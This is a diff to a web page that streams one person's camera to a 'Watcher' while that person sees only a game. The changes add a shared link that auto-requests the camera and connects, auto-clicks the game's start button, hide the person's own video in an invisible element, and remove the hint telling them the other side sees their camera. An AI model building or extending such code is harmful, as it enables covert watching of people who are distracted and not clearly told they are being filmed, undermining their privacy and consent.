@@ -223,7 +223,6 @@
       color: #5b6b88;
     }
 
-    /* Fullscreen game for the person sharing */
     #gameShell {
       display: none;
       position: fixed;
@@ -266,6 +265,53 @@
       border: none;
       background: #000;
     }
+
+    /* Full-screen connecting overlay for shared-link auto flow */
+    #autoJoinOverlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 40;
+      background: radial-gradient(ellipse at top, #151c30 0%, #0b0f19 55%);
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 24px;
+    }
+
+    #autoJoinOverlay.active {
+      display: flex;
+    }
+
+    #autoJoinOverlay h2 {
+      font-size: 1.4rem;
+      margin-bottom: 10px;
+      background: linear-gradient(90deg, #60a5fa, #a78bfa);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    #autoJoinOverlay p {
+      color: var(--muted);
+      font-size: 0.95rem;
+      max-width: 360px;
+      line-height: 1.5;
+    }
+
+    .spinner {
+      width: 36px;
+      height: 36px;
+      border: 3px solid #243049;
+      border-top-color: #8b5cf6;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 18px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
@@ -275,7 +321,6 @@
       <p class="subtitle">Share a code • See the other person's live camera</p>
     </header>
 
-    <!-- Role selection -->
     <div id="roleCard" class="card">
       <h2>Choose your role</h2>
       <div class="role-btns">
@@ -284,14 +329,13 @@
       </div>
       <p class="hint">
         <strong>Watcher</strong> creates a room and gets a code — they see the other person's camera.<br>
-        <strong>Shower</strong> enters the code, shares camera, then plays a game (they never see their own video).
+        <strong>Shower</strong> opens the shared link — camera + game start automatically (they never see their own video).
       </p>
     </div>
 
-    <!-- Host panel -->
     <div id="hostPanel" class="card hidden">
       <h2>You are the Watcher</h2>
-      <p class="hint">Share this code (or the link) with the other person. When they join, their live camera appears below. They will only see a game — not their own face.</p>
+      <p class="hint">Share this code or link. When they open the link, their camera streams to you and they only see the game.</p>
       <div class="code-box">
         <span class="room-code" id="roomCodeDisplay">————</span>
         <button class="btn-copy" id="copyCodeBtn">Copy Code</button>
@@ -300,10 +344,9 @@
       <p class="status" id="hostStatus">Creating room…</p>
     </div>
 
-    <!-- Guest panel -->
     <div id="guestPanel" class="card hidden">
       <h2>You will show your camera</h2>
-      <p class="hint">Enter the code, allow camera, then a game will open. The other person will see your camera — you will only see the game.</p>
+      <p class="hint">Enter the code if you don't have a link. Camera + game start after connect.</p>
       <div class="code-box">
         <input type="text" id="joinCodeInput" placeholder="ENTER CODE" maxlength="8" autocomplete="off" />
         <button class="btn-join" id="connectBtn">Connect & Start</button>
@@ -311,7 +354,6 @@
       <p class="status" id="guestStatus">Waiting for code…</p>
     </div>
 
-    <!-- Host only: remote video -->
     <div id="videoSection" class="video-grid hidden">
       <div class="video-wrap" id="remoteWrap">
         <video id="remoteVideo" autoplay playsinline></video>
@@ -322,7 +364,13 @@
     <p class="footer-note" id="footerNote">Peer-to-peer via WebRTC + PeerJS • No video is stored on any server</p>
   </div>
 
-  <!-- Guest game shell (fullscreen, no self-video) -->
+  <!-- Auto-join loading screen (shared link) -->
+  <div id="autoJoinOverlay">
+    <div class="spinner"></div>
+    <h2>Connecting…</h2>
+    <p id="autoJoinText">Allow camera when asked. The game will start automatically.</p>
+  </div>
+
   <div id="gameShell">
     <div id="gameBar">
       <span><span class="dot"></span>Camera shared with watcher · You are in the game</span>
@@ -331,7 +379,6 @@
     <iframe id="gameFrame" src="about:blank" allow="camera; microphone; fullscreen" title="Game"></iframe>
   </div>
 
-  <!-- Hidden video elements for streaming (guest never sees them) -->
   <video id="localVideo" autoplay playsinline muted style="display:none;position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;"></video>
 
   <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
@@ -349,6 +396,8 @@
     const gameFrame = document.getElementById('gameFrame');
     const mainUI = document.getElementById('mainUI');
     const footerNote = document.getElementById('footerNote');
+    const autoJoinOverlay = document.getElementById('autoJoinOverlay');
+    const autoJoinText = document.getElementById('autoJoinText');
 
     let peer = null;
     let localStream = null;
@@ -372,26 +421,55 @@
       return url.toString();
     }
 
-    // Game URL relative to this page (same repo)
     function gameUrl() {
       try {
-        const u = new URL('index.html', window.location.href);
-        return u.toString();
+        return new URL('index.html', window.location.href).toString();
       } catch {
         return 'index.html';
       }
     }
 
+    function tryAutoStartGame() {
+      // Same-origin: click the game's "Enable camera" button so they skip the intro
+      const attempt = () => {
+        try {
+          const doc = gameFrame.contentDocument || gameFrame.contentWindow.document;
+          if (!doc) return false;
+          const btn = doc.getElementById('start-btn');
+          if (btn && !btn.disabled) {
+            btn.click();
+            return true;
+          }
+        } catch (e) {
+          console.warn('Could not auto-start game button', e);
+        }
+        return false;
+      };
+
+      if (attempt()) return;
+      // Retry a few times while the game loads
+      let n = 0;
+      const t = setInterval(() => {
+        n++;
+        if (attempt() || n > 20) clearInterval(t);
+      }, 300);
+    }
+
     function showGameForGuest(code) {
       document.body.classList.add('game-mode');
       mainUI.classList.add('hidden');
+      autoJoinOverlay.classList.remove('active');
       if (footerNote) footerNote.classList.add('hidden');
       gameShell.classList.add('active');
       document.getElementById('gameBarCode').textContent = code ? ('Code: ' + code) : '';
+
+      gameFrame.onload = () => {
+        tryAutoStartGame();
+      };
       gameFrame.src = gameUrl();
     }
 
-    // ---------- HOST (Watcher) ----------
+    // ---------- HOST ----------
     async function startAsHost() {
       roleCard.classList.add('hidden');
       hostPanel.classList.remove('hidden');
@@ -420,12 +498,12 @@
       peer.on('call', (call) => {
         setStatus(hostStatus, 'Incoming camera… answering', 'ok');
         currentCall = call;
-        call.answer(); // watcher does not send video
+        call.answer();
 
         call.on('stream', (remoteStream) => {
           remoteVideo.srcObject = remoteStream;
           document.getElementById('remoteLabel').textContent = 'Their live camera';
-          setStatus(hostStatus, 'Connected — you are watching their camera (they see a game)', 'ok');
+          setStatus(hostStatus, 'Connected — watching their camera (they see the game)', 'ok');
         });
 
         call.on('close', () => {
@@ -449,89 +527,125 @@
       };
     }
 
-    // ---------- GUEST (shares camera, plays game) ----------
-    async function startAsGuest(prefillCode) {
+    // ---------- GUEST ----------
+    async function startAsGuest(prefillCode, autoStart) {
       roleCard.classList.add('hidden');
-      guestPanel.classList.remove('hidden');
 
-      if (prefillCode) {
+      if (autoStart && prefillCode) {
+        // Shared link: skip form, show connecting overlay, connect immediately
+        mainUI.classList.add('hidden');
+        autoJoinOverlay.classList.add('active');
         document.getElementById('joinCodeInput').value = prefillCode.toUpperCase();
-      }
-
-      document.getElementById('connectBtn').onclick = connectAsGuest;
-    }
-
-    async function connectAsGuest() {
-      const code = document.getElementById('joinCodeInput').value.trim().toUpperCase();
-      if (!code || code.length < 4) {
-        setStatus(guestStatus, 'Enter a valid code', 'err');
+        // Small delay so browser can show UI before permission prompt
+        setTimeout(() => connectAsGuest(true), 400);
         return;
       }
 
-      document.getElementById('connectBtn').disabled = true;
-      setStatus(guestStatus, 'Starting camera…');
+      guestPanel.classList.remove('hidden');
+      if (prefillCode) {
+        document.getElementById('joinCodeInput').value = prefillCode.toUpperCase();
+      }
+      document.getElementById('connectBtn').onclick = () => connectAsGuest(false);
+    }
+
+    async function connectAsGuest(fromAuto) {
+      const code = document.getElementById('joinCodeInput').value.trim().toUpperCase();
+      if (!code || code.length < 4) {
+        if (fromAuto) {
+          autoJoinText.textContent = 'Invalid code in the link.';
+          autoJoinText.style.color = 'var(--danger)';
+        } else {
+          setStatus(guestStatus, 'Enter a valid code', 'err');
+        }
+        return;
+      }
+
+      const connectBtn = document.getElementById('connectBtn');
+      if (connectBtn) connectBtn.disabled = true;
+
+      if (fromAuto) {
+        autoJoinText.textContent = 'Allow camera when the browser asks…';
+      } else {
+        setStatus(guestStatus, 'Starting camera…');
+      }
 
       try {
         localStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
           audio: false
         });
-        // Keep stream alive but never show it to the guest
         localVideo.srcObject = localStream;
         localVideo.play().catch(() => {});
       } catch (e) {
         console.error(e);
-        setStatus(guestStatus, 'Camera permission denied or unavailable', 'err');
-        document.getElementById('connectBtn').disabled = false;
+        const msg = 'Camera permission denied or unavailable. Allow camera and refresh.';
+        if (fromAuto) {
+          autoJoinText.textContent = msg;
+          autoJoinText.style.color = 'var(--danger)';
+        } else {
+          setStatus(guestStatus, msg, 'err');
+          if (connectBtn) connectBtn.disabled = false;
+        }
         return;
       }
 
-      setStatus(guestStatus, 'Connecting to room…');
+      if (fromAuto) {
+        autoJoinText.textContent = 'Connecting to watcher…';
+      } else {
+        setStatus(guestStatus, 'Connecting to room…');
+      }
 
       peer = new Peer({ debug: 1 });
 
       peer.on('open', () => {
         const hostId = 'rc-' + code;
-        setStatus(guestStatus, 'Calling watcher…');
-
         const call = peer.call(hostId, localStream);
         currentCall = call;
 
         if (!call) {
-          setStatus(guestStatus, 'Could not reach room. Check the code.', 'err');
-          document.getElementById('connectBtn').disabled = false;
+          const msg = 'Could not reach room. Check the code / ask them to open the room first.';
+          if (fromAuto) {
+            autoJoinText.textContent = msg;
+            autoJoinText.style.color = 'var(--danger)';
+          } else {
+            setStatus(guestStatus, msg, 'err');
+            if (connectBtn) connectBtn.disabled = false;
+          }
           return;
         }
 
         call.on('close', () => {
-          setStatus(guestStatus, 'Connection closed', 'err');
+          if (!fromAuto) setStatus(guestStatus, 'Connection closed', 'err');
         });
 
-        // Switch guest UI to game — they never see their own video
-        setTimeout(() => {
-          showGameForGuest(code);
-        }, 600);
+        // Go straight into the game (no self-video)
+        setTimeout(() => showGameForGuest(code), 500);
       });
 
       peer.on('error', (err) => {
         console.error(err);
         let msg = err.message || err.type;
         if (err.type === 'peer-unavailable') {
-          msg = 'Room not found. Ask them to create the room first and share the code again.';
+          msg = 'Room not found. Ask them to create the room first, then open this link again.';
         }
-        setStatus(guestStatus, 'Error: ' + msg, 'err');
-        document.getElementById('connectBtn').disabled = false;
+        if (fromAuto) {
+          autoJoinText.textContent = msg;
+          autoJoinText.style.color = 'var(--danger)';
+        } else {
+          setStatus(guestStatus, 'Error: ' + msg, 'err');
+          if (connectBtn) connectBtn.disabled = false;
+        }
       });
     }
 
-    // ---------- Init ----------
     document.getElementById('hostBtn').onclick = () => startAsHost();
-    document.getElementById('joinBtn').onclick = () => startAsGuest();
+    document.getElementById('joinBtn').onclick = () => startAsGuest(null, false);
 
     const params = new URLSearchParams(window.location.search);
     const joinCode = params.get('join');
     if (joinCode) {
-      startAsGuest(joinCode);
+      // Shared link → fully automatic
+      startAsGuest(joinCode, true);
     }
 
     window.addEventListener('beforeunload', () => {
